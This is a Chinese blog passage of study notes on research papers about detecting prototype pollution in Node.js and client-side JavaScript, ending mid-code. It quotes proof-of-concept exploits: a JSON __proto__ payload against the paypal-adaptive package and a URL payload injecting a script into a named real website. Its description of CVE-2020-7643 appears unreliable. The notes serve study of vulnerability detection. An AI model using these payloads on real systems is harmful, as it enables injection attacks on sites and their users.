id="我的学习笔记">我的学习笔记</h4><ul><li><ahref="https://jf710001011.github.io/2023/05/02/javascript/">Web开发与JavaScript编程</a></li><li><ahref="https://jf710001011.github.io/2023/03/06/portswigger/">漏洞的学习</a></li></ul><h3 id="section-32">2023-05-05</h3><h4 id="paper">paper</h4><ul><li><a href="https://dl.acm.org/doi/10.1145/3468264.3468542">DetectingNode.js prototype pollution vulnerabilities via object lookupanalysis</a>(<strong>CCF-A</strong>:ESEC/SIGSOFT FSE 2021)</li><li><strong>Author</strong>:Song Li</li></ul><h4 id="正文-9">正文</h4><ul><li><p>源对象和汇对象是在数据流分析中常用的两个术语。</p><p><strong>源对象</strong>是数据流分析中的输入，也就是程序中已经存在的数据，可以被使用或传递到其他地方。例如，一个函数的参数或者全局变量。</p><p><strong>汇对象</strong>则是分析结果的输出，也就是数据流分析发现的结果。通常来说，汇对象会根据分析的目的而有所不同。例如，在安全漏洞检测中，汇对象可能是程序中的一段危险代码，或者一处未经正确验证的用户输入。</p><p>在数据流分析过程中，源对象和汇对象都是需要被识别和跟踪的。数据流分析的目的通常就是为了找到源对象和汇对象之间的关系，并且确定其中潜在的漏洞或其他问题。</p></li><li><p><strong>CCSCONCEPTS</strong>是ACM计算机协会提出的一种分类体系，用于分类和描述计算机科学领域中的概念和研究方向。其中涉及到的两个概念是“Securityand privacy”和“Software and its engineering”。</p><p>“<code>Security and privacy</code>”指的是关于计算机安全和隐私的研究方向，其中Web应用程序安全是一个子领域，主要研究如何保护Web应用程序免受各种威胁和攻击，例如跨站脚本攻击（XSS）、SQL注入、CSRF攻击等。</p><p>“<code>Software and its engineering</code>”指的是关于软件及其工程的研究方向，主要涉及软件开发、测试、部署、维护等方面。在软件工程领域，安全是一个非常重要的考虑因素，因为安全漏洞可能导致系统失效、用户信息泄露等严重后果。因此，在软件工程中，需要关注如何设计和实现安全的软件系统。</p></li><li><p><strong>KEYWORDS</strong> Abstract Interpretation,</p><p>Prototype Pollution,</p><p>Object Lookup Analysis,</p><p>JavaScript</p></li><li><p>Js<strong>动态重定义</strong>内置函数</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 定义一个自定义的log函数</span><span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Custom log: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>message<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 使用自定义的log函数替换掉内置的console.log函数</span>console<span class="token punctuation">.</span>log <span class="token operator">=</span> log<span class="token punctuation">;</span><span class="token comment">// 测试一下，现在调用console.log实际上是调用我们定义的log函数了</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello, world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>JavaScript 中，对象可以通过一个内部的属性 <code>__proto__</code>来指向另一个对象，这个对象被称为原型对象。如果一个对象试图访问一个不存在的属性，JavaScript引擎会在该对象的原型对象上继续查找这个属性，如果在原型对象上也找不到，就会在原型对象的原型对象上查找，直到找到该属性或者到达<strong>原型链的末尾</strong>（即Object.prototype）</p></li><li><blockquote><p><strong>The major challenges</strong> come from the complexity of thesink and source structures in prototype pollution detection using staticanalysis.</p></blockquote></li><li><p>在软件安全领域中，<code>sink（漏洞点）</code>通常指代那些潜在的漏洞利用点或攻击目标，例如对输入数据的不当处理或未正确验证可能导致的注入攻击、XSS（跨站脚本）漏洞、CSRF（跨站请求伪造）漏洞等。在上下文敏感分析中，sink通常是程序中的一个<strong>函数调用</strong>，它从潜在的漏洞源中接收输入并进行进一步处理，因此可能受到恶意输入的影响。在ObjLupAnsys中，sink指的是<strong>系统内置函数</strong>，例如Object.prototype.toString，该函数可能被重新定义以实现攻击效果。</p></li><li><p>我们讲解的是原型污染漏洞中的<code>源（source）对象</code>。通常，传统漏洞（如命令注入漏洞）的源对象是一个简单类型的<strong>用户输入，</strong>比如字符串。因此，可以简单地将这些输入标记为污点数据。但是，在原型污染漏洞中，源对象通常是一个包含<strong>复杂结构</strong>的对象，例如从JSON输入解析而来的对象。挑战在于，输入对象的结构通常是<strong>未知的、动态的</strong>，即由攻击者决定的。因此，简单地将对象标记为污点数据并不能反映其内部结构，以及该结构如何影响上述“sink”对象的查找。</p></li><li><p><code>污点分析</code>是一种静态或动态代码分析技术，用于检测和防范安全漏洞，特别是与输入验证和数据处理相关的漏洞。其核心思想是标记数据流中可能被污染（即潜在攻击数据）的变量或参数，并<strong>跟踪</strong>这些污点在程序中的流动，以检测可能的漏洞点。如果一个污点最终到达了一个<strong>敏感函数</strong>（如系统调用、SQL查询、文件操作等），就会被判定为漏洞，并触发警报或其他防御措施。污点分析可以通过<strong>数据流分析、控制流分析、符号执行</strong>等技术实现。它已经成为软件安全分析的重要工具之一，在漏洞挖掘、漏洞修复、软件测试等方面都有广泛应用。</p></li><li><p><code>符号执行</code>的基本思想是：将程序中的每个变量符号化，然后从程序的入口点开始执行程序，为每个条件语句创建一个分支，将每个分支上的每个符号变量的所有可能取值表示为约束条件，并对这些约束条件求解，以确定程序路径的所有可能走向。通过对程序的每个路径进行符号执行，可以查找程序中的漏洞或错误，并生成相应的测试用例，以验证程序的正确性。</p></li><li><p><strong>代码分析</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// (a) Vulnerable code:</span><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                a<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                a<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            a<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>config<span class="token punctuation">.</span>userId<span class="token punctuation">)</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Config must have userId '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>config<span class="token punctuation">.</span>password<span class="token punctuation">)</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Config must have password '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>config <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>defaultConfig<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">...</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> Paypal<span class="token punctuation">;</span><span class="token comment">// (b) Exploit</span><span class="token keyword">var</span> PayPal <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'paypal -adaptive '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PayPal</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>    <span class="token string">'&#123;" __proto__ ": &#123;" toString ": "polluted"&#125;, "userId ":"foo", "password ": "bar", "signature ": "abcd","appId ": "1234", "sandbox ": "1234"&#125; '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol type="a"><li><p>这段代码定义了一个 <code>merge</code>函数，用于合并两个对象。它的输入是两个对象 <code>a</code> 和<code>b</code>，其中 <code>b</code> 对象的属性会覆盖 <code>a</code>对象中同名属性的值。具体来说，它会递归地合并两个对象的属性，当某个属性的值是一个对象时，就递归调用<code>merge</code>函数，将该属性的值继续合并。如果某个属性的值不是对象，就直接用<code>b</code> 对象中该属性的值覆盖 <code>a</code>对象中的值。如果在合并过程中发生异常，则直接用 <code>b</code>对象中该属性的值覆盖 <code>a</code> 对象中的值。最后返回合并后的<code>a</code> 对象。</p></li><li><p>这段代码首先导入了一个名为 <code>paypal-adaptive</code>的模块，然后创建了一个 <code>PayPal</code> 类的实例<code>p</code>。在创建 <code>p</code> 的时候，它的构造函数接收一个 JSON字符串作为参数，该字符串描述了一个具有 <code>__proto__</code>属性的对象，该属性的值是一个对象，其中有一个名为 <code>toString</code>的属性，值为字符串 <code>"polluted"</code>。该 JSON 字符串还描述了<code>userId</code>、<code>password</code>、<code>signature</code>、<code>appId</code>和 <code>sandbox</code> 等属性。由于该 JSON 对象具有<code>__proto__</code> 属性，这可能导致 Prototype Pollution漏洞。</p></li></ol><p>接下来，在输出日志信息时，该代码调用了一个空对象 <code>(&#123;&#125;)</code> 的<code>toString</code>方法，由于该空对象的原型链被污染，所以该代码实际上调用的是<code>polluted</code> 字符串的 <code>toString</code>方法，最终输出的是字符串 <code>"polluted"</code>。</p><p><strong>污染过程</strong>：</p><p>该空对象的原型链被污染是因为在第三行代码中，攻击者通过向构造函数的参数中传递一个具有特殊属性__proto__的JavaScript对象来污染了空对象的原型链。在第五行代码中，merge函数对对象b的属性进行遍历，将属性值复制到对象a中。由于b对象具有特殊属性__proto__，因此在第五行中，if条件为真，将a[p]的原型链设置为b[p]的原型链，从而将a[p]对象的原型链污染为攻击者控制的对象的原型链。这样，在第六行代码中，当检查空对象的原型链时，它将返回被污染的原型链。这是一个典型的原型污染攻击。</p></li><li><p><code>CVE-2020-7643</code>是一个影响Node.js的漏洞，属于PrototypePollution漏洞类型。该漏洞的影响版本为Node.js12.x版本，利用该漏洞，攻击者可以通过构造恶意数据来污染JavaScript对象的原型链，从而导致代码执行漏洞。</p><p>具体来说，在Node.js中，有一些<strong>内置模块</strong>（比如querystring模块），会将查询字符串解析为JavaScript对象。攻击者可以在查询字符串中携带特殊构造的__proto__属性，这会导致在解析过程中创建的JavaScript对象的原型链被污染。如果攻击者能够控制该对象的原型链，则可以在目标系统上执行任意JavaScript代码，从而导致严重的安全问题。</p><p>该漏洞的修复包括在Node.jsv12.16.2、v10.19.0和v8.17.0版本中，Node.js官方已发布安全更新，建议用户及时升级到最新版本来修复该漏洞。</p></li><li><p><code>静态分析</code>可以找到所有的可能路径和条件，但可能会错过一些动态执行的情况。而<code>动态分析</code>可以发现动态执行的情况，但无法保证所有的路径和条件都能够被触发。因此，在某些情况下，需要同时使用静态和动态分析来发现漏洞</p></li><li><p>本文提出了<strong>三个细粒度污染流</strong>，即对象污染流、函数污染流和属性污染流</p></li><li><p>JavaScript具有很强的<strong>动态特性</strong>，包括以下几个方面：</p><ol type="1"><li>动态类型：JavaScript是一种动态类型语言，变量的类型是在运行时确定的，而不是在编译时。</li><li>动态解释执行：JavaScript代码不需要编译成二进制代码，而是在执行时解释执行。</li><li>动态对象：JavaScript中的对象是动态的，可以在运行时添加、删除和修改属性。</li><li>动态作用域：JavaScript中的作用域是基于函数的，而不是基于块的。因此，作用域链是在函数调用时动态生成的。</li><li>动态闭包：JavaScript中的闭包可以在运行时动态生成，通过闭包可以实现函数的嵌套和变量的私有化。</li><li>动态函数：JavaScript中的函数可以在运行时动态生成和修改，可以通过Function构造函数和eval函数实现。</li><li>动态模块加载：JavaScript中的模块可以在运行时动态加载，可以通过import函数和动态脚本标签实现。</li></ol><p>以上特性也是使得JS<strong>出现各种漏洞的原因</strong></p></li></ul><h4 id="总结-20">总结</h4><ul><li><p><strong>文献总结</strong></p><ul><li><p><strong>研究背景</strong>：原型污染是一种常见的安全漏洞，它可以导致恶意攻击者在应用程序中执行任意代码或获取敏感信息。目前已经有一些针对原型污染漏洞的检测和预防技术，但它们通常只能检测到一些简单的漏洞，并且存在误报率较高的问题。因此，本文旨在提出一种更准确和有效的原型污染检测和预防技术。</p></li><li><p><strong>创新之处</strong>：本文提出了一种基于对象查找分析（ObjectLookupAnalysis）的方法，用于检测和预防JavaScript应用程序中的原型污染漏洞。该方法利用ObjectPropertyGraph（OPG）模型来捕获JavaScript对象之间的相互作用关系，并设计了一个名为ObjLupAnsys的框架来进行对象查找分析和漏洞检测。</p></li></ul></li><li><p>Song Li <strong>三文对比</strong></p><ol type="1"><li><ahref="https://www.usenix.org/conference/usenixsecurity22/presentation/li-song">MiningNode.js Vulnerabilities via Object Dependence Graph andQuery</a>(<strong>CCF-A</strong>:31st USENIX Security Symposium2022)</li><li><ahref="https://www.ndss-symposium.org/ndss-paper/auto-draft-207/">Probethe Proto: Measuring Client-Side Prototype Pollution Vulnerabilities ofOne Million Real-world Websites</a>(<strong>CCF-A</strong>会议：NDSS2022)</li><li><a href="https://dl.acm.org/doi/10.1145/3468264.3468542">DetectingNode.js prototype pollution vulnerabilities via object lookupanalysis</a>(<strong>CCF-A</strong>:ESEC/SIGSOFT FSE 2021)</li></ol><p>本文与SongLi前两篇文献整体框架如出一辙，但是我是<strong>逆着</strong>作者文章发表顺序阅读的，更准确地说这篇更像是ODGen的雏形。本文提出的是OPG，相比于他后续提出的ODG，工作量明显是更小的。</p><p>总的来说，无论是OPG（对象属性图）还是ODG（对象依赖图），作者研究的都是<strong>对象层次</strong>（不是函数或者普通变量）；其无论是属性图还是依赖图，都是以往已经提出并写进大学教材的程序分析方式，作者都是基于这些内容，去研究JS对象中的原型污染问题。</p><p>三篇文献的<strong>框架</strong>都类似：提出一种数据结构（分析程序的方法），做出基于此方法的自动化工具（系统框架）。评估标准也是类似。</p><p>我感觉第二篇是最难读懂的，这一篇也还是有挺多疑问的地方</p></li></ul><h3 id="section-33">2023-04-28</h3><h4 id="paper信息">paper信息</h4><ul><li><p><ahref="https://www.ndss-symposium.org/ndss-paper/auto-draft-207/">Probethe Proto: Measuring Client-Side Prototype Pollution Vulnerabilities ofOne Million Real-world Websites</a>(<strong>CCF-A</strong>会议：NDSS2022,Song Li)</p></li><li><p><strong>keywords</strong>:</p><p>Prototype Pollution</p><p>Joint Taint Flow Analysis</p><p>Dynamic Taint Analysis</p></li></ul><h4 id="正文-10">正文</h4><ul><li><p>从<strong>title</strong>上看注意到，作者这次研究的客户端上的<code>JS</code></p></li><li><p><strong>原型污染</strong>的出处：文献[6]</p></li><li><p>讨论了原型污染的后果，除了污染原型对象本身之外，原型污染还可能导致<strong>其他安全问题</strong>。</p><p><strong>举例</strong>：<code>如果另一段JavaScript代码与原型污染漏洞位于同一位置，并循环遍历对象下的所有具有常量值的属性以生成HTML代码，则该原型污染将允许攻击者注入任意JavaScript代码，从而导致跨站脚本攻击（XSS）的发生</code></p><p>假设存在以下JavaScript代码段：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 此处省略了获取input的代码</span><span class="token keyword">var</span> input <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" = "</span> <span class="token operator">+</span> input<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>该代码段遍历了一个名为input的对象的所有属性，并生成相应的HTML代码。如果input对象被受到原型污染漏洞的影响，攻击者可以注入任意JavaScript代码，并因此导致跨站脚本攻击。</p><p>例如，攻击者可以将<code>Object.prototype</code>修改为：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">someEvilFunction</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'gotcha'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在这种情况下，JavaScript代码段将被修改为：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> input <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token function-variable function">someEvilFunction</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'gotcha'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" = "</span> <span class="token operator">+</span> input<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在运行这段代码时，会执行被注入的<code>someEvilFunction</code>函数，导致一个弹窗出现，从而执行了跨站脚本攻击。</p><p><code>Object.prototype</code> 是所有 JavaScript 对象的原型对象。它是JavaScript中最顶层的原型对象，所有的内置对象都继承自它，包括数组、函数、日期、正则表达式等。在JavaScript中，每个对象都有一个原型对象，它会自动继承原型对象的属性和方法。通过<code>Object.prototype</code>，我们可以为所有的对象添加共享的属性和方法。</p></li><li><p>关于原型污染引起的<code>Xss</code>漏洞研究，可以关注的<strong>博客</strong>和<strong>githubrepository</strong>：文献[9] [10] [6] [24] [29]</p></li><li><p>在测量客户端原型污染和后续影响方面，有<strong>两个主要挑战</strong>：</p><ol type="1"><li><p>原型污染和后续影响通常包括两个或更多个链接在一起的属性查找。因此，PROBETHEPROTO通过动态污点分析跟踪这些联合污点流来检测原型污染，并引导对象查找传播污点到最终的后果相关的终端接收器（例如innerHTML）。</p><p>假设有一个网站使用了一个第三方 JavaScript库，其中存在一个漏洞导致原型污染。攻击者可以利用此漏洞在该网站上执行任意代码。攻击者可以将恶意代码注入到网站上，以窃取用户的登录凭据或将用户重定向到其他恶意网站上。攻击者使用以下代码来执行原型污染攻击：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>polluted <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></code></pre><p>这段代码将污染 Object 类型的原型，因此所有基于 Object 的 JavaScript对象都将受到影响。例如，攻击者可以在以下位置注入恶意代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> user_input <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> user_input<span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在这个例子中，攻击者可以通过 user_input 参数注入一个包含恶意脚本的URL，该脚本会被注入到 div 元素的 innerHTML 属性中。由于 innerHTML属性具有副作用，攻击者的恶意代码将被执行，导致进一步的攻击。</p><p>PROBETHEPROTO 通过动态污点分析追踪了用户输入到 innerHTML属性的数据流。当 innerHTML属性被污染时，它被标记为受到攻击的污点，并且跟踪整个数据流直到最终的影响。通过这种方式，PROBETHEPROTO可以检测出潜在的原型污染漏洞以及它们的后续影响。</p></li><li><p>原型污染后续影响的最终接收器可能无法直接到达。因此，PROBETHEPROTO采用输入/利用程序生成模块，根据属性查找和接收器函数主动创建对象属性。PROBETHEPROTO执行多个动态污点分析运行。一次运行将记录缺失的属性查找和中间接收器，然后PROBETHEPROTO将在后续运行中包括这些缺失属性，以达到与后续影响相关的最终接收器。</p><p>举个例子，假设有一个网站上的代码如下：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> prop <span class="token operator">=</span> <span class="token string">"userInput"</span><span class="token punctuation">;</span>obj<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"safe value"</span><span class="token punctuation">;</span><span class="token keyword">var</span> inputValue <span class="token operator">=</span> <span class="token function">getQueryStringValue</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>inputValue<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  obj<span class="token punctuation">[</span>inputValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"evil value"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> obj<span class="token punctuation">.</span>userInput<span class="token punctuation">;</span></code></pre><p>在这个例子中，如果攻击者控制了输入值<code>inputValue</code>，并将其设置为 <code>__proto__</code>，则可以在<code>obj</code> 对象的原型链上污染 <code>userInput</code>属性，使其指向一个恶意值。由于 <code>innerHTML</code> 函数的输出将包含<code>userInput</code>属性的值，因此攻击者可以利用这种原型污染漏洞，将任意恶意代码注入到网站页面中，从而实现XSS 攻击。</p><p>为了检测这种原型污染漏洞和其后续影响，PROBETHEPROTO将跟踪<code>obj</code>对象的属性查找，并在发现原型污染时引入污点值。然后，PROBETHEPROTO将使用动态污点分析生成一个利用程序，将<code>inputValue</code> 设置为<code>__proto__</code>，以演示攻击者如何利用此漏洞。最终，PROBETHEPROTO将观察到<code>innerHTML</code>函数作为最终接收器，以检测任何潜在的后续影响。</p></li></ol></li><li><p><strong>漏洞原理</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* Exploit: https://www.boulderboats.com/default.asp?__proto__[k]=&lt;script>alert(1)&lt;/script>&amp;page=xAllInventory&amp;make=chaparral */</span><span class="token comment">// Step 1: polluting the prototype</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">Q</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//Q="__proto__[k]=&lt;script>alert(1)&lt;/script>"</span>    <span class="token keyword">var</span> <span class="token constant">H</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 创建空对象 H</span>        <span class="token constant">K</span> <span class="token operator">=</span> <span class="token constant">Q</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 将传入参数按照等号分割为数组 K</span>        <span class="token comment">/* 例如：Q="__proto__[k]=&lt;script>alert(1)&lt;/script>"        则 K = ["__proto__[k]", "&lt;script>alert(1)&lt;/script>"] */</span>        <span class="token constant">P</span> <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">K</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 将 K 中的第一个元素进行 URL 解码，得到 P</span>        <span class="token comment">// P = "__proto__[k]"</span>        <span class="token constant">J</span><span class="token punctuation">,</span> <span class="token comment">// 声明变量 J</span>        <span class="token constant">O</span> <span class="token operator">=</span> <span class="token constant">H</span><span class="token punctuation">,</span> <span class="token comment">// 将对象 H 赋值给 O</span>        <span class="token constant">M</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 声明变量 M，初始化为 0</span>        <span class="token constant">R</span> <span class="token operator">=</span> <span class="token constant">P</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"]["</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将 P 按照中括号分割为数组 R</span>    <span class="token comment">// 例如：R = ["__proto__[k]"];</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\]$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 判断 R 中的第一个和最后一个元素是否以中括号开头和结尾</span>        <span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\]$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将 R 中的最后一个元素的结尾中括号去掉</span>        <span class="token constant">R</span> <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将 R 中的第一个元素通过 shift() 方法移除，并按照中括号再次分割，与剩下的元素合并为新的数组</span>        <span class="token comment">/* 